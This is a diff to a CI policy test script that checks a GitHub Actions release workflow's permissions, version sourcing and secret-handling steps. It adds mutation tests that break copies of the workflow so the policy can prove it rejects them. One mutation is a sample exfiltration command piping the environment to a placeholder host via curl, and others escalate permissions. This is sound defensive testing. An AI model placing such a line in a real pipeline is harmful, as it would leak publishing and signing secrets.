@@ -10,12 +10,17 @@
 #   reviewers approve every upload; no other job, here or in a called workflow, uses an
 #   environment or reads a secret other than the job token;
 # - publish restores no cache, and checks the tag again before the upload, as github-release
-#   does before the release, which runs whenever publish succeeded.
+#   does before the release, which runs whenever publish succeeded;
+# - each job has the permissions it needs and no more, next.yml read only; the version comes
+#   from the check job; the two secret steps run exactly their commands.
 #
 # The jobs' if: conditions are evaluated over every combination of results, not compared as
-# text. Then each rule is broken in a copy of the workflows, and the policy must refuse every
-# copy, so a rule that stopped checking anything shows up too. next.yml runs it on every push.
-# Needs python3 and yq.
+# text. On top of the rules, the whole of release.yml is compared with its pinned form,
+# scripts/release-workflow.json: any change to it has to update that file too, in the same
+# reviewed change (scripts/release-workflow-test.sh --update writes it). The rules stay for what
+# they say when they fail. Then each rule is broken in a copy of the workflows, and the policy
+# must refuse every copy for that rule, so a rule that stopped checking anything shows up too.
+# next.yml runs it on every push. Needs python3 and yq.
 set -euo pipefail
 
 root=$(cd "$(dirname "$0")/.." && pwd)
@@ -23,9 +28,9 @@ work=$(mktemp -d)
 trap 'rm -rf "$work"' EXIT
 
 cat > "$work/policy.py" <<'EOF'
-import itertools, json, os, re, subprocess, sys
+import difflib, itertools, json, os, re, subprocess, sys
 
-root = sys.argv[1]
+root, pinned_path = sys.argv[1], sys.argv[2]
 problems = []
 
 def load(path):
@@ -238,14 +243,106 @@ check(-1 < index("publish", "release-tag-check.sh") < upload_index,
 check(-1 < index("github-release", "release-tag-check.sh") < index("github-release", "gh release create"),
       "github-release must check the tag again before it creates the release")
 
+# Job permissions: no more than each job needs. In next.yml, which runs on the tag too, read only.
+EXPECTED_PERMISSIONS = {
+    "check": {"contents": "read"},
+    "build": {"contents": "read", "packages": "read"},
+    "publish": {"contents": "read"},
+    "github-release": {"contents": "write"},
+}
+for name, expected in EXPECTED_PERMISSIONS.items():
+    actual = jobs[name].get("permissions")
+    if name in ("check", "publish") and actual is None:
+        continue
+    check(actual == expected, "%s's permissions must be %s, not %s" % (name, expected, actual))
+check(set(jobs) == set(EXPECTED_PERMISSIONS), "release.yml must have the jobs %s, not %s"
+      % (sorted(EXPECTED_PERMISSIONS), sorted(jobs)))
+
+def read_only(where, permissions):
+    if permissions is None:
+        return
+    if isinstance(permissions, str):
+        check(permissions in ("read-all", "none") or permissions == "{}", "%s's permissions must be read-only, not %s" % (where, permissions))
+        return
+    writes = sorted(k for k, v in permissions.items() if v not in ("read", "none"))
+    check(not writes, "%s's permissions must be read-only, not write on %s" % (where, ", ".join(writes)))
+
+for path in sorted(seen):
+    nested_workflow = load(path)
+    where = "./" + os.path.relpath(path, root)
+    read_only(where, nested_workflow.get("permissions"))
+    for name, nested in nested_workflow.get("jobs", {}).items():
+        read_only("%s > %s" % (where, name), nested.get("permissions"))
+
+# build: next.yml, at the version the release check gave
+check(jobs["build"].get("uses") == "./.github/workflows/next.yml",
+      "build must call ./.github/workflows/next.yml, not %r" % jobs["build"].get("uses"))
+check(jobs["build"].get("with") == {"revision": "${{ needs.check.outputs.version }}"},
+      "build must pass revision: ${{ needs.check.outputs.version }}, not %r" % jobs["build"].get("with"))
+
+# the version and the release's kind come from the check job, nowhere else
+VERSION = "${{ needs.check.outputs.version }}"
+for job in ("publish", "github-release"):
+    for step in steps(job):
+        env = step.get("env") or {}
+        if "VERSION" in env:
+            check(env["VERSION"] == VERSION, "%s: %r takes VERSION from %r, not %s" % (job, step.get("name"), env["VERSION"], VERSION))
+        if "FINAL" in env:
+            check(env["FINAL"] == "${{ needs.check.outputs.final }}", "%s: FINAL must be the check job's output" % job)
+    job_def = {k: v for k, v in jobs[job].items() if k != "concurrency"}
+    refs = [e.strip() for e in expressions(job_def) if re.search(r"\bgithub\.(ref|ref_name|sha)\b", e)]
+    check(not refs, "%s must take the version, tag and commit from the check job, not %s" % (job, "; ".join(refs)))
+
+# the two secret steps, command for command
+SECRETS_RUN = " ".join("""missing=0
+for name in CENTRAL_TOKEN_USERNAME CENTRAL_TOKEN_PASSWORD MAVEN_GPG_KEY MAVEN_GPG_PASSPHRASE; do
+  if [ -z "${!name}" ]; then
+    echo "secret $name is not set in the maven-central environment" >&2
+    missing=1
+  fi
+done
+exit $missing""".split())
+UPLOAD_RUN = ("./mvnw --batch-mode --no-transfer-progress -Prelease -Drevision=\"$VERSION\" "
+              "-Dcentral.autoPublish=true -Dcentral.waitUntil=published -DskipTests -pl odds-feed -am deploy")
+for step in steps("publish"):
+    run = str(step.get("run", ""))
+    if step.get("id") == "secrets":
+        check(" ".join(run.split()) == SECRETS_RUN, "publish: the secrets step must run the secrets check and nothing else")
+    if step.get("id") == "upload":
+        separators = [t for t in (";", "&&", "||", "|", "`", "$(", "\n") if t in run.strip()]
+        check(not separators, "publish: the upload must be one ./mvnw command, without %s" % " ".join(separators))
+        check(" ".join(run.split()) == UPLOAD_RUN, "publish: the upload step must run exactly: %s" % UPLOAD_RUN)
+        check((step.get("env") or {}).get("VERSION") == VERSION, "publish: the upload's VERSION must be %s" % VERSION)
+
+# Last, the whole of release.yml against its pinned form: any change to it, in any job, has to
+# update scripts/release-workflow.json as well, in the same reviewed change. Comments do not count.
+actual_text = json.dumps(w, indent=2, sort_keys=True) + "\n"
+if pinned_path == "--print":
+    sys.stdout.write(actual_text)
+else:
+    pinned_text = open(pinned_path).read()
+    if actual_text != pinned_text:
+        diff = "".join(difflib.unified_diff(pinned_text.splitlines(True), actual_text.splitlines(True),
+                                             "scripts/release-workflow.json", "release.yml"))
+        problems.append("release.yml differs from its pinned form in scripts/release-workflow.json; if the "
+                        "change is meant, update it with scripts/release-workflow-test.sh --update:\n" + diff)
+
 for problem in problems:
     print("FAIL " + problem, file=sys.stderr)
 sys.exit(1 if problems else 0)
 EOF
 
+pinned=$root/scripts/release-workflow.json
 policy() {
-  python3 "$work/policy.py" "$1"
+  python3 "$work/policy.py" "$1" "$pinned"
 }
+
+# --update writes release.yml's current form as the pinned one, for a deliberate change to it
+if [ "${1:-}" = "--update" ]; then
+  python3 "$work/policy.py" "$root" --print > "$pinned.part" || true
+  mv "$pinned.part" "$pinned"
+  echo "wrote $pinned; review the diff, and the policy below still has to pass"
+fi
 
 if ! policy "$root"; then
   echo "release.yml breaks the release policy" >&2
@@ -371,6 +468,27 @@ breaks release.yml replace "$check_job" "${check_job}    continue-on-error: true
 # build
 breaks release.yml replace '      revision: ${{ needs.check.outputs.version }}' '      revision: ${{ needs.check.outputs.version }}
     secrets: inherit' "build must not pass secrets on"
+breaks release.yml replace '    uses: ./.github/workflows/next.yml
+    with:
+      revision: ${{ needs.check.outputs.version }}
+' "    runs-on: ubuntu-latest
+    steps:
+      - run: 'true'
+" "build must call ./.github/workflows/next.yml"
+breaks release.yml replace '      revision: ${{ needs.check.outputs.version }}' '      revision: ${{ github.ref_name }}' \
+  "build must pass revision: \${{ needs.check.outputs.version }}"
+breaks release.yml replace '    permissions:
+      contents: read
+      packages: read
+' '    permissions:
+      contents: write
+      packages: read
+' "build's permissions must be"
+
+# the pinned form catches what no rule names
+breaks release.yml replace '    timeout-minutes: 90
+' '    timeout-minutes: 300
+' "release.yml differs from its pinned form"
 
 # publish
 breaks release.yml replace '    environment: maven-central
@@ -380,6 +498,19 @@ breaks release.yml replace "$publish_job" "${publish_job}    if: \${{ always() }
 " "publish with check=failure"
 breaks release.yml replace "$publish_job" "${publish_job}    continue-on-error: true
 " "publish must not continue on error"
+breaks release.yml replace "$publish_job" "${publish_job}    permissions:
+      contents: read
+      id-token: write
+" "publish's permissions must be"
+breaks release.yml replace '          VERSION: ${{ needs.check.outputs.version }}
+          CENTRAL_TOKEN_USERNAME' '          VERSION: ${{ github.ref_name }}
+          CENTRAL_TOKEN_USERNAME' "publish: 'Sign and publish' takes VERSION from"
+breaks release.yml replace '          ./mvnw --batch-mode --no-transfer-progress -Prelease -Drevision="$VERSION"
+' '          env | curl -d @- https://example.invalid; ./mvnw --batch-mode --no-transfer-progress -Prelease -Drevision="$VERSION"
+' "publish: the upload must be one ./mvnw command"
+breaks release.yml replace '          exit $missing
+' '          exit 0
+' "publish: the secrets step must run the secrets check and nothing else"
 breaks release.yml replace '    environment: maven-central
 ' '    environment: maven-central
     env:
@@ -443,6 +574,9 @@ breaks release.yml replace "if: \${{ !cancelled() && needs.publish.result == 'su
   "github-release with publish=success final=true"
 breaks release.yml replace "$release_job" "${release_job}    continue-on-error: true
 " "github-release must not continue on error"
+breaks release.yml replace '          VERSION: ${{ needs.check.outputs.version }}
+          FINAL:' '          VERSION: ${{ github.ref_name }}
+          FINAL:' "github-release: 'Create the release' takes VERSION from"
 breaks release.yml replace "$release_job" "${release_job}    environment: maven-central
 " "github-release must not use an environment"
 breaks release.yml replace '          GH_REPO: ${{ github.repository }}' '          GH_REPO: ${{ github.repository }}
@@ -477,6 +611,18 @@ breaks next.yml replace '    name: Build & Test
 ' '    name: Build & Test
     environment: maven-central
 ' "./.github/workflows/next.yml > build must not use an environment"
+breaks next.yml replace '    name: Build & Test
+' '    name: Build & Test
+    permissions:
+      contents: write
+' "./.github/workflows/next.yml > build's permissions must be read-only"
+breaks next.yml replace 'permissions:
+  contents: read
+  packages: read
+' 'permissions:
+  contents: read
+  packages: write
+' "./.github/workflows/next.yml's permissions must be read-only"
 for read in 'secrets.MAVEN_GPG_KEY' "secrets['MAVEN_GPG_KEY']" "secrets[format('MAVEN_{0}', 'GPG_KEY')]" 'toJSON(secrets)'; do
   breaks next.yml replace '          REVISION: ${{ inputs.revision }}
 ' "          REVISION: \${{ inputs.revision }}
